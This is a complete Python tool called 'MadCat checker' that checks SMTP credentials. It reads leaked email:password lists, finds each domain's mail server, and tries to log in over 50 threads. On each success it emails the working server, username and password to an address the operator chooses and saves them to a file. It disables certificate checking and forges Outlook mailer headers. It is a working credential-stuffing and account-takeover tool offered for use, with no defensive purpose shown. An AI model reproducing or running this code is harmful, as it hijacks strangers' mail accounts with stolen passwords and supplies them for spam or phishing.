import socket,threading,base64,datetime,sys,ssl,smtplib,time,re,os,random,signal,queue,subprocess
from dns import resolver
from email.mime.text import MIMEText

# ~~~~ SMTP checker script ~~~~~~~~~~~~~~~~~~
# ~~~~ MadCat checker v1.2 ~~~~~~~~~~~~~~~~~~
# ~~~~ https://github.com/aels/mailtools ~~~~
# ~~~~ contact: https://t.me/freebug ~~~~~~~~

if sys.version_info[0] < 3:
	raise Exception("Python 3 or a more recent version is required.")
try:
	from alive_progress import alive_bar
except ImportError:
	from pip._internal import main as pip
	pip(['install', '--user', 'alive_progress'])
	from alive_progresss import alive_bar

class c:
	HEAD = "\033[95m"
	BLUE = "\033[94m"
	CYAN = "\033[96m"
	GREEN = "\033[92m"
	WARN = "\033[93m"
	FAIL = "\033[91m"
	END = "\033[0m"
	BOLD = "\033[1m"
	UNDERLINE = "\033[4m"

def get_mx_server(domain):
	global mx_cache, timeout
	if not domain in mx_cache:
		for data in resolver.query(domain, 'MX'):
			mx_host = data.exchange.to_text()[0:-1]
			break
		for h in [mx_host,domain,'smtp.'+domain,'mail.'+domain,'webmail.'+domain,'mx.'+domain]:
			for p in [587,465]:
				try:
					s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					s.setblocking(0)
					s.settimeout(1)
					if p==465:
						s = ssl.wrap_socket(s)
					s.connect((h, p))
					s.close()
					mx_cache[domain] = (h, str(p))
					return mx_cache[domain]
				except Exception as e:
					pass
		mx_cache[domain] = False
	return mx_cache[domain]

def quit(signum, frame):
	print('\b'*10+f'{c.CYAN}{c.BOLD}Exiting...{c.END}\n')
	sys.exit(0)

def is_valid_email(email):
	return re.match(r'^[a-z0-9._+-]+@[a-z0-9.-]+\.[a-z]{2,}$', email.lower())

def find_email_password_indexes(list_filename):
	email_index = False
	password_index = False
	with open(list_filename) as fp:
		for line in fp:
			line = re.sub('[;,\t| \'"]+', ':', line.lower())
			email = re.search(r'[a-z0-9._+-]+@[a-z0-9.-]+\.[a-z]{2,}', line)
			if email_index is False and email:
				email_index = line.split(email.group(0))[0].count(':') or 0
			if password_index is False and re.search(r'@.+123', line):
				password_index = line.split('123')[0].count(':')
			if email_index is not False and password_index is not False:
				return (email_index, password_index)
	password_index = email_index+1
	return (email_index, password_index)

def print_statuses(thread_name, thread_status):
	global threads_statuses, threads_count, threads_counter, goods, quee
	sys.stdout.write('\033[F'*threads_count+'\033[F')
	threads_statuses[thread_name] = thread_status
	print((
		f'[ queue size: {c.BOLD}{quee.qsize()}{c.END} ]'+
		f'[ cpu load: {c.BOLD}{round(os.getloadavg()[0]/os.cpu_count(),2)}{c.END} ]'+
		f'[ threads: {c.BOLD}{threads_counter}{c.END} ]'+
		f'[ goods: {c.BOLD}{c.GREEN}{goods}{c.END} ]'
	).rjust(144))
	for i in range(threads_count):
		print(threads_statuses['thread'+str(i)])

def wc_count(filename):
	return int(subprocess.check_output(['wc', '-l', filename]).split()[0])

def is_ignored_host(mail):
	global exclude_mail_hosts
	for ignored_str in exclude_mail_hosts.split(','):
		if ignored_str in mail.split('@')[1]:
			return True
	return False

def smtp_connect_and_send(smtp_server, port, smtp_user, password):
	global verify_email, timeout
	message = MIMEText(f'{smtp_server}|{port}|{smtp_user}|{password}', 'html', 'utf-8')
	message['From'] = f'MadCat checker <{smtp_user}>'
	message['To'] = verify_email
	message['Subject'] = 'new SMTP from MadCat checker'
	headers =f'Return-Path: {smtp_user}\n'
	headers+=f'Reply-To: {smtp_user}\n'
	headers+= 'X-Priority: 1\n'
	headers+= 'X-MSmail-Priority: High\n'
	headers+= 'X-Mailer: Microsoft Office Outlook, Build 10.0.5610\n'
	headers+= 'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\n'
	if port == '587':
		context = ssl.create_default_context()
		context.check_hostname = False
		context.verify_mode = ssl.CERT_NONE
		server_obj = smtplib.SMTP(smtp_server, port, timeout=float(timeout))
		server_obj.starttls(context=context)
	elif port == '465':
		server_obj = smtplib.SMTP_SSL(smtp_server, port, timeout=float(timeout))
	else:
		server_obj = smtplib.SMTP(smtp_server, port, timeout=float(timeout))
	server_obj.ehlo()
	server_obj.login(smtp_user, password)
	server_obj.sendmail(smtp_user, verify_email, headers+message.as_string())
	server_obj.quit()

def worker_item(quee, results):
	global threads_counter, verify_email, goods
	self = threading.current_thread()
	while True:
		if quee.empty():
			results.put((self.name,f'queue exhausted, {c.BOLD}sleeping...{c.END}'))
			time.sleep(3)
			if quee.empty():
				break
		else:
			smtp_server, port, smtp_user, password = quee.get()
			results.put((self.name,f'{c.WARN}{c.BOLD}trying mx for{c.END} {smtp_user}:{password}'))
			if not smtp_server or not port:
				try:
					smtp_server, port = get_mx_server(smtp_user.split('@')[1])
				except Exception as e:
					continue
			results.put((self.name,f'{c.BOLD}connecting to{c.END} {smtp_server}|{port}|{smtp_user}|{password}'))
			try:
				smtp_connect_and_send(smtp_server, port, smtp_user, password)
				results.put((self.name,f'{c.GREEN}{c.BOLD}{smtp_user}:{password}{c.END} sent to {verify_email}'))
				open(smtp_filename, 'a').write(f"{smtp_server}|{port}|{smtp_user}|{password}\n")
				goods += 1
				time.sleep(1)
			except Exception as e:
				e = str(e).strip()[0:100]
				results.put((self.name,f'{smtp_server}:{port} - {c.FAIL}{c.BOLD}{e}{c.END}'))
				open(errors_filename, 'a').write(f"{smtp_server}|{port}|{smtp_user}|{password} - {e}\n")
	threads_counter -= 1

signal.signal(signal.SIGINT, quit)
quee = queue.Queue()
results = queue.Queue()
goods = 0
threads_count = 50
threads_counter = 0
threads_statuses = {}
mx_cache = {}
timeout = 3
threads_started = False
try:
	list_filename = sys.argv[1]
	smtp_filename = sys.argv[1].split('.')
	smtp_filename[-2] = smtp_filename[-2]+'_smtp'
	smtp_filename = '.'.join(smtp_filename)
	errors_filename = smtp_filename.replace('_smtp', '_errors')
	verify_email = sys.argv[2]
	if not is_valid_email(verify_email):
		raise
	exclude_mail_hosts = sys.argv[3] or 'sorry,mom'
	start_from_line = sys.argv[4] or 0
except:
	exit(f'usage: \npython3 {sys.argv[0]} list.txt verify_email@example.com [exclude,mail,hosts] [start_from_line]')
email_index, password_index = find_email_password_indexes(list_filename)
total_lines = wc_count(list_filename)
print(f'verification email: {c.BOLD}{verify_email}{c.END}')
print(f'email_index: {c.BOLD}{str(email_index)}{c.END}')
print(f'password_index: {c.BOLD}{str(password_index)}{c.END}')
print(f'total lines to procceed: {c.BOLD}{str(total_lines)}{c.END}')
sys.stdout.write('\n'*threads_count)
with alive_bar(total_lines, bar='blocks', title='Progress:') as progress_bar, open(list_filename) as fp:
	for i in range(int(start_from_line)):
		line = fp.readline()
		progress_bar()
	while True:
		while quee.qsize()<threads_count*2:
			line = fp.readline().strip()
			if not line:
				break
			if line.count('|')==3:
				quee.put((line.split('|')))
			else:
				line = re.sub('[;,\t| \'"]+', ':', line)
				fields = line.split(':')
				if len(fields)>1 and is_valid_email(fields[email_index]) and len(fields[password_index])>7 and not is_ignored_host(fields[email_index]):
					quee.put((False,False,fields[email_index],fields[password_index]))
				else:
					progress_bar()
		if not results.empty():
			thread_name, thread_status = results.get()
			print_statuses(thread_name, '\b'*10+thread_status)
			if 'trying' in thread_status:
				progress_bar()
		if threads_counter == 0 and quee.empty():
			print('\b'*10+f'{c.GREEN}{c.BOLD}All done.{c.END}')
			break
		if not threads_started:
			while threads_counter < threads_count:
				threading.Thread(name='thread'+str(threads_counter), target=worker_item, args=(quee,results), daemon=True).start()
				threads_statuses['thread'+str(threads_counter)] = 'no data'
				threads_counter += 1
			threads_started = True
